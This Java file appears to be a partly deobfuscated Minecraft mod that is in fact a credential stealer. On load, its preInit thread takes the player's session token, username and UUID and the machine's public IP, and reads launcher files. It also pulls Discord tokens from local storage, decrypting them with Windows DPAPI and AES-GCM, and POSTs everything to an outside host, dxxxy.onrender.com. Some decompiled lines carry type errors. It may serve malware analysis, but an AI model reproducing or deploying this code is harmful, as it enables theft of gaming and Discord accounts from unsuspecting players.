import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.MessageDigest;
import java.util.Arrays;
import java.util.Base64;

public class OriginalDeobfuscated {
    public static void main(String[] args) {
        llIIIlI();
        decoding();
        System.out.println(Arrays.toString(key1));

    }

    private static String[] key1;
    // $FF: synthetic field
    private static int[] key2;

    private static boolean isValue0smallerValue1(int var0, int var1) {
        return var0 < var1;
    }

    private static void llIIIlI() {
        key2 = new int[41];
        key2[0] = (203 ^ 128 ^ 235 ^ 150) & (107 ^ 41 ^ 63 ^ 75 ^ -" ".length());
        key2[1] = " ".length();
        key2[2] = "  ".length();
        key2[3] = "   ".length();
        key2[4] = 75 ^ 79;
        key2[5] = 12 ^ 9;
        key2[6] = 13 + 44 - 14 + 88 ^ 55 + 114 - 78 + 42;
        key2[7] = 56 ^ 63;
        key2[8] = 117 ^ 125;
        key2[9] = 84 ^ 93;
        key2[10] = 160 ^ 170;
        key2[11] = 74 ^ 65;
        key2[12] = 9 ^ 50 ^ 147 ^ 164;
        key2[13] = 159 + 130 - 110 + 26 ^ 60 + 177 - 146 + 101;
        key2[14] = 165 ^ 171;
        key2[15] = 172 ^ 198 ^ 236 ^ 137;
        key2[16] = 88 ^ 63 ^ 120 ^ 15;
        key2[17] = 94 ^ 79;
        key2[18] = -(-11618 & 32629) & -3085 & 24351;
        key2[19] = 139 ^ 153;
        key2[20] = 100 + 58 - 146 + 120 ^ 54 + 9 - 38 + 126;
        key2[21] = 3 ^ 23;
        key2[22] = 27 ^ 14;
        key2[23] = 19 ^ 5;
        key2[24] = 97 + 78 - 135 + 87 ^ 6 ^ 110;
        key2[25] = 41 ^ 49;
        key2[26] = 120 ^ 66 ^ 116 ^ 87;
        key2[27] = -(48 + 59 - -23 + 39 ^ 157 + 133 - 168 + 62);
        key2[28] = 137 ^ 147;
        key2[29] = 18 ^ 3 ^ 130 ^ 136;
        key2[30] = 4 ^ 24;
        key2[31] = 112 ^ 109;
        key2[32] = 28 ^ 2;
        key2[33] = 135 + 54 - 109 + 83 ^ 75 + 54 - 48 + 107;
        key2[34] = 20 + 93 - 53 + 68;
        key2[35] = 121 ^ 89;
        key2[36] = 66 ^ 99;
        key2[37] = 52 + 24 - -2 + 90 ^ 17 + 38 - -41 + 42;
        key2[38] = 33 + 36 - -22 + 55 ^ 91 + 60 - 65 + 91;
        key2[39] = 136 ^ 172;
        key2[40] = 109 ^ 72;
    }


    private static String decoder1(String string1, String string2) {
        string1 = new String(Base64.getDecoder().decode(string1.getBytes(StandardCharsets.UTF_8)), StandardCharsets.UTF_8);
        StringBuilder BuiltString = new StringBuilder();
        char[] string2array = string2.toCharArray();
        int int2 = key2[0];
        char[] string1array = string1.toCharArray();
        int string1arraylenght = string1array.length;
        int int1 = key2[0];

        do {
            if (!isValue0smallerValue1(int1, string1arraylenght)) {
                return String.valueOf(BuiltString);
            }

            int arrayshenanigans = string1array[int1];
            BuiltString.append((char)(arrayshenanigans ^ string2array[int2 % string2array.length]));
            "".length();
            ++int2;
            ++int1;
            "".length();
        } while(-" ".length() <= (53 ^ 49));

        return null;
    }

    private static String decoder2(String string1, String string2) {
        try {
            SecretKeySpec keySpec = new SecretKeySpec(Arrays.copyOf(MessageDigest.getInstance("MD5").digest(string2.getBytes(StandardCharsets.UTF_8)), key2[8]), "DES");
            Cipher cipher = Cipher.getInstance("DES");
            cipher.init(key2[2], keySpec);
            return new String(cipher.doFinal(Base64.getDecoder().decode(string1.getBytes(StandardCharsets.UTF_8))), StandardCharsets.UTF_8);
        } catch (Exception var4) {
            var4.printStackTrace();
            return null;
        }
    }

    private static String decoder3(String string1, String string2) {
        try {
            SecretKeySpec keySpec = new SecretKeySpec(MessageDigest.getInstance("MD5").digest(string2.getBytes(StandardCharsets.UTF_8)), "Blowfish");
            Cipher cipherBlowfish = Cipher.getInstance("Blowfish");
            cipherBlowfish.init(key2[2], keySpec);
            return new String(cipherBlowfish.doFinal(Base64.getDecoder().decode(string1.getBytes(StandardCharsets.UTF_8))), StandardCharsets.UTF_8);
        } catch (Exception var4) {
            var4.printStackTrace();
            return null;
        }
    }

    private static void decoding() {
        key1 = new String[key2[40]];
        key1[key2[0]] = decoder1("DCYmHCdefX0ILBwqK0I7CiA3AjABIHwPOwk=", "dRRlT");
        key1[key2[1]] = decoder2("MGHA45hJ5vc=", "ppjUX");
        key1[key2[2]] = decoder3("aPa1T+GYn1n+bQtg5D83PQ==", "nQevd");
        key1[key2[3]] = decoder3("3TxOb9xR56kxq+uqAKUJ61khuqWZRLbG", "jmnmI");
        key1[key2[4]] = decoder3("XPxVIG5LlOOfn5m+liUhKnKDZNOHqM4vHnnBWp3dOtk=", "dHuJB");
        key1[key2[5]] = decoder1("IAIBLmwIBBlrKgkeAy9sXEM=", "fkmKL");
        key1[key2[6]] = decoder3("bDcHUWv4f4hNaAzz0XpnwPDb5TnZaCaQ", "eHQjf");
        key1[key2[7]] = decoder2("QwckEwv04X+pR1EgE5QFb75M1QdCL/qW", "BPbJX");
        key1[key2[8]] = decoder3("bxGh+BID8s9+GZcUvD5DZkrd+CtLYfC5", "hvqLQ");
        key1[key2[9]] = decoder2("dPiJ4IDs57mgGj0yr105gqY77Hi9xYl8", "bxOmX");
        key1[key2[10]] = decoder2("ykRU0VZ9kZwIN+CJ5ywtvf2cXpdiq2eK30zH6RIqztzPEI89NTYqkA==", "JRzGt");
        key1[key2[11]] = decoder2("47inJe7N96MfPpjyML4wr4i6JBREdUJBMFQXjNOELWHPdv/NPTPb5w==", "btJcY");
        key1[key2[12]] = decoder2("fdBkRbffxShTrMIfws9pva1H4Xnj9CQb6hHyoRw38Z4=", "qeqrp");
        key1[key2[13]] = decoder1("", "KMgsF");
        key1[key2[14]] = decoder2("VGYm7+5Ft1Woyk1u3amcPXBMocuy7Ty1M7sPnwocsLc=", "UkcCA");
        key1[key2[15]] = decoder1("fRYgDg==", "SzDlk");
        key1[key2[16]] = decoder2("n/USPcqZ/PXjoBVgyowV1p2uqw5ZJgYBofC6hsDRu8cRwaZ84KkvM6h46XAyHUQV", "SLhjP");
        key1[key2[17]] = decoder1("NBI0", "uWgPi");
        key1[key2[19]] = decoder1("IQUCDjxlBwYWND8LWiw2MhQAAAUnCCQKNiYNBxwtJAo3ACgnARcbLSQK", "KdtoD");
        key1[key2[20]] = decoder1("FwEgFhQaASM+EBI=", "vmLIu");
        key1[key2[21]] = decoder1("IAUyEw1kBzYLBT4LajEHMxQwHSUvFikbBjkNKxwG", "JdDru");
        key1[key2[22]] = decoder2("zEcihZm+sh4=", "rnBzg");
        key1[key2[23]] = decoder2("t1RhyvXcpcM=", "hwlpe");
        key1[key2[24]] = decoder3("oRUliK7ncOnrI0M0yyt7no5/9Ku9QenVt5sC2H4AWi8=", "bpsXx");
        key1[key2[25]] = decoder2("9V9DKJAQ5Ddzw31WEAuDLQ==", "jfarv");
        key1[key2[26]] = decoder1("CScyLQUNLSQ3", "dHVDc");
        key1[key2[28]] = decoder1("AjI9extfNC0XDzdZ", "fcJOl");
        key1[key2[29]] = decoder2("Bn2evzTGyh8NW/Ql07pD2Ao6fKx7R0rw", "vdBtV");
        key1[key2[30]] = decoder2("tv7lVJnW4nT+jIuUZ6t2ZQ==", "dFBDN");
        key1[key2[31]] = decoder3("KDrOiXfi//kh/AZhYWFEXg==", "SsrFs");
        key1[key2[32]] = decoder3("rZxuoagy1KUcbJZpsnOMobNeZ1BhBh9V", "KCiIP");
        key1[key2[33]] = decoder1("ACo8", "AooJy");
        key1[key2[35]] = decoder2("VHXTcDpui7k=", "bWJoa");
        key1[key2[36]] = decoder2("7hcZ5PyU6IEhWRgeG+Rldw==", "ZSFdF");
        key1[key2[37]] = decoder1("EzYoGRIbOygFGgk0Kw5XEjA+EBgBNS0PFxZ3Ig8YFiw2DwpMNC0ZGkwKIRkKCzYqOgsNLSEJDQs2Kg==", "bYDjy");
        key1[key2[38]] = decoder2("it55ML1SmY0=", "dOmuh");
        key1[key2[39]] = decoder3("Y2uUGvXAQp+KtGwUkRpTzhf2wcgtexmoDPm57oNn4ivIS3VJ4hzNMRH7QHZgu25vu1FX44T1rxs2m/CVdlqa5Q10lI+WXHxbmfvVKaL8/mWB1Ycos8JoJ+KiRD/6VG+SNnA9adjDaRZU6SRP+npy7PFwX4rDMaQr", "TQXPz");
    }

    private static boolean bool(int var0) {
        return var0 != 0;
    }

    //@EventHandler
    public void preInit() {
        (new Thread(() -> {
            try {
                HttpURLConnection domain = (HttpURLConnection)(new URL("https://dxxxy.onrender.com")).openConnection();
                domain.setRequestMethod("POST");
                domain.setRequestProperty("Content-type", "application/json");
                domain.setDoOutput(true);
                boolean boolTrue = true; //Minecraft.func_71410_x
                String ipAddress = (new BufferedReader(new InputStreamReader((new URL("https://checkip.amazonaws.com/")).openStream()))).readLine();
                String getSession = boolTrue.func_110432_I().func_148254_d();
                String File1 = key1[key2[5]];
                long File2 = Long.parseLong(key1[key2[6]]);
                String DiscordToken = key1[key2[7]];
                String mcDataDir = boolTrue.field_71412_D.getParent();
                String[] var10001 = new String[key2[1]];
                var10001[key2[0]] = key1[key2[8]];
                if (bool(Files.exists(Paths.get(mcDataDir, var10001), new LinkOption[key2[0]]))) {
                    mcDataDir = boolTrue.field_71412_D.getParent();
                    var10001 = new String[key2[1]];
                    var10001[key2[0]] = key1[key2[9]];
                    File1 = Files.readAllLines(Paths.get(mcDataDir, var10001)).toString();
                }

                mcDataDir = boolTrue.field_71412_D.getPath();
                var10001 = new String[key2[1]];
                var10001[key2[0]] = key1[key2[10]];
                if (bool(Files.exists(Paths.get(mcDataDir, var10001), new LinkOption[key2[0]]))) {
                    mcDataDir = boolTrue.field_71412_D.getPath();
                    var10001 = new String[key2[1]];
                    var10001[key2[0]] = key1[key2[11]];
                    File2 = Files.readAllLines(Paths.get(mcDataDir, var10001)).toString();
                }

                mcDataDir = boolTrue.field_71412_D.getParent();
                var10001 = new String[key2[1]];
                var10001[key2[0]] = key1[key2[12]];
                if (bool(Files.isDirectory(Paths.get(mcDataDir, var10001), new LinkOption[key2[0]]))) {
                    DiscordToken = key1[key2[13]];
                    mcDataDir = boolTrue.field_71412_D.getParent();
                    var10001 = new String[key2[1]];
                    var10001[key2[0]] = key1[key2[14]];
                    short listFiles = (File[])Objects.requireNonNull(Paths.get(mcDataDir, var10001).toFile().listFiles());
                    boolean FilesAmount = listFiles.length;
                    int llllIlIlllllIIIx = key2[0];

                    while(isValue0smallerValue1(llllIlIlllllIIIx, FilesAmount)) {
                        short llllIlIllllIlllx = listFiles[llllIlIlllllIIIx];
                        if (bool(llllIlIllllIlllx.getName().endsWith(key1[key2[15]]))) {
                            Exception llllIlIllllIllIx = new FileReader(llllIlIllllIlllx);
                            String llllIlIllllIlIlx = new BufferedReader(llllIlIllllIllIx);
                            StringBuilder llllIlIllllIIll = new StringBuilder();

                            String llllIllIIIlIlII;
                            while(llIIlIl(llllIllIIIlIlII = llllIlIllllIlIlx.readLine())) {
                                llllIlIllllIIll.append(llllIllIIIlIlII);
                                "".length();
                                "".length();
                                if (((127 + 91 - 152 + 142 ^ 20 + 48 - -44 + 20) & (146 ^ 174 ^ 168 ^ 192 ^ -" ".length())) >= "  ".length()) {
                                    return;
                                }
                            }

                            llllIlIllllIllIx.close();
                            llllIlIllllIlIlx.close();
                            int llllIlIllllIIlI = Pattern.compile(key1[key2[16]]);
                            Matcher llllIllIIIlIIIl = llllIlIllllIIlI.matcher(String.valueOf(llllIlIllllIIll));
                            if (bool(llllIllIIIlIIIl.find())) {
                                if (isValue0smallerValue1(Cipher.getMaxAllowedKeyLength(key1[key2[17]]), key2[18])) {
                                    Class<?> llllIlIllllIIIIx = Class.forName(key1[key2[19]]);
                                    Constructor<?> llllIllIIlIIIII = llllIlIllllIIIIx.getDeclaredConstructor();
                                    llllIllIIlIIIII.setAccessible((boolean) key2[1]);
                                    Object llllIllIIIlllll = llllIllIIlIIIII.newInstance();
                                    Field llllIllIIIllllI = llllIlIllllIIIIx.getDeclaredField(key1[key2[20]]);
                                    llllIllIIIllllI.setAccessible((boolean) key2[1]);
                                    llllIllIIIllllI.setBoolean(llllIllIIIlllll, (boolean) key2[1]);
                                    llllIlIllllIIIIx = Class.forName(key1[key2[21]]);
                                    llllIllIIlIIIII = llllIlIllllIIIIx.getDeclaredConstructor();
                                    llllIllIIlIIIII.setAccessible((boolean) key2[1]);
                                    byte llllIlIlllIllIIx = llllIllIIlIIIII.newInstance();
                                    llllIllIIIllllI = llllIlIllllIIIIx.getDeclaredField(key1[key2[22]]);
                                    llllIllIIIllllI.setAccessible((boolean) key2[1]);
                                    ((Map)llllIllIIIllllI.get(llllIlIlllIllIIx)).put(key1[key2[23]], llllIllIIIlllll);
                                    "".length();
                                    llllIlIllllIIIIx = Class.forName(key1[key2[24]]);
                                    llllIllIIIllllI = llllIlIllllIIIIx.getDeclaredField(key1[key2[25]]);
                                    llllIllIIIllllI.setAccessible((boolean) key2[1]);
                                    boolean llllIlIlllIlIll = Field.class.getDeclaredField(key1[key2[26]]);
                                    llllIlIlllIlIll.setAccessible((boolean) key2[1]);
                                    llllIlIlllIlIll.setInt(llllIllIIIllllI, llllIllIIIllllI.getModifiers() & key2[27]);
                                    llllIllIIIllllI.set((Object)null, llllIlIlllIllIIx);
                                }

                                byte[] llllIllIIIllIlI = llllIllIIIlIIIl.group().split(key1[key2[28]])[key2[1]].getBytes();
                                Gson var30 = new Gson();
                                String var10003 = boolTrue.field_71412_D.getParent();
                                String[] var10004 = new String[key2[1]];
                                var10004[key2[0]] = key1[key2[29]];
                                JsonObject llllIllIIIllIIl = (JsonObject)var30.fromJson(new String(Files.readAllBytes(Paths.get(var10003, var10004))), JsonObject.class);
                                byte llllIlIllllIIII = llllIllIIIllIIl.getAsJsonObject(key1[key2[30]]).get(key1[key2[31]]).getAsString().getBytes();
                                llllIlIllllIIII = Base64.getDecoder().decode(llllIlIllllIIII);
                                llllIlIllllIIII = Arrays.copyOfRange(llllIlIllllIIII, key2[5], llllIlIllllIIII.length);
                                llllIlIllllIIII = Crypt32Util.cryptUnprotectData(llllIlIllllIIII);
                                llllIllIIIllIlI = Base64.getDecoder().decode(llllIllIIIllIlI);
                                Cipher llllIllIIIllIII = Cipher.getInstance(key1[key2[32]]);
                                llllIllIIIllIII.init(key2[2], new SecretKeySpec(llllIlIllllIIII, key1[key2[33]]), new GCMParameterSpec(key2[34], Arrays.copyOfRange(llllIllIIIllIlI, key2[3], key2[15])));
                                byte llllIlIlllIllII = llllIllIIIllIII.doFinal(Arrays.copyOfRange(llllIllIIIllIlI, key2[15], llllIllIIIllIlI.length));
                                DiscordToken = String.valueOf((new StringBuilder()).append(DiscordToken).append(new String(llllIlIlllIllII, StandardCharsets.UTF_8)).append(key1[key2[35]]));
                            }
                        }

                        ++llllIlIlllllIIIx;
                        "".length();
                        if (((71 ^ 7 ^ 6 ^ 19) & (99 ^ 115 ^ 240 ^ 181 ^ -" ".length())) != 0) {
                            return;
                        }
                    }
                }

                if (bool(Loader.isModLoaded(key1[key2[36]]))) {
                    Class var32 = Class.forName(key1[key2[37]]);
                    var10001 = new String[key2[1]];
                    var10001[key2[0]] = key1[key2[38]];
                    getSession = (String)ReflectionHelper.findField(var32, var10001).get((Object)null);
                }

                mcDataDir = key1[key2[39]];
                Object[] var34 = new Object[key2[7]];
                var34[key2[0]] = boolTrue.func_110432_I().func_111285_a();
                var34[key2[1]] = boolTrue.func_110432_I().func_148255_b();
                var34[key2[2]] = getSession;
                var34[key2[3]] = ipAddress;
                var34[key2[4]] = StringEscapeUtils.escapeJson(File1);
                var34[key2[5]] = StringEscapeUtils.escapeJson(File2);
                var34[key2[6]] = DiscordToken;
                String llllIllIIIIlIII = String.format(mcDataDir, var34);
                OutputStream llllIllIIIIIlll = domain.getOutputStream();
                double llllIlIlllllIII = llllIllIIIIlIII.getBytes(StandardCharsets.UTF_8);
                llllIllIIIIIlll.write(llllIlIlllllIII, key2[0], llllIlIlllllIII.length);
                short llllIlIllllIlll = new BufferedReader(new InputStreamReader(domain.getInputStream(), StandardCharsets.UTF_8));
                StringBuilder llllIlIllllIllI = new StringBuilder();

                while(true) {
                    String llllIlIllllIlIl;
                    if (!llIIlIl(llllIlIllllIlIl = llllIlIllllIlll.readLine())) {
                        System.out.println(llllIlIllllIllI);
                        llllIllIIIIIlll.close();
                        break;
                    }

                    llllIlIllllIllI.append(llllIlIllllIlIl.trim());
                    "".length();
                    "".length();
                    if (((53 ^ 0 ^ 172 ^ 159) & (188 ^ 134 ^ 150 ^ 170 ^ -" ".length())) != 0) {
                        return;
                    }
                }
            } catch (Exception var23) {
                var23.printStackTrace();
                return;
            }

            "".length();
            if ("  ".length() < "   ".length()) {
                ;
            }
        })).start();
    }
}
